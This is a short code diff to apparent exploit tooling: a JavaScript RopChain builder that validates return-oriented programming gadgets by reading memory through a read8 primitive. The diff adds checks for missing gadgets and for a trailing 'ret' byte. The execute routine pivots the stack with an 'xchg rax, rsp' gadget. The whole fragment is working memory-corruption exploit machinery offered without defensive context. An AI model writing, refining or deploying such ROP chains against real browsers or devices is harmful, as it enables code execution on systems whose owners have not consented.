@@ -54,12 +54,16 @@ function RopChain() {
     this.add = function(instr) {
         if (typeof(instr) === "string") {
             var gadget = gadgets[instr];
-            if(gadget.machine) {
+            if(typeof(gadget) === 'undefined') {
+              throw "Gadget "+instr+" was not found";
+            }
+            if(typeof(gadget.machine) != "undefined") {
                 var tmp = [];
                 var valid = true;
                 for(var i = 0; i < gadget.machine.length; i++){
                     if((tmp[tmp.length] = read8(gadget.addr().add(i))) != gadget.machine[i]) valid = false;
                 }
+                if(read8(gadget.addr().add(gadget.machine.length)) != 0xc3) valid = false;
                 if(!valid){
                   throw "Opcode invalid in "+instr+" got "+tmp.reduce(function(p,c){ return p+c.toString(16)+' '},"")
                 }
@@ -97,7 +101,6 @@ function RopChain() {
 
 
     this.execute = function() {
-        debug_log("execute");
         var xchg = gadgets['xchg rax, rsp; dec dword ptr [rax - 0x77]'];
         rop_buf[2] = xchg.addr().getLowBitsUnsigned()
         rop_buf[3] = xchg.addr().getHighBitsUnsigned()
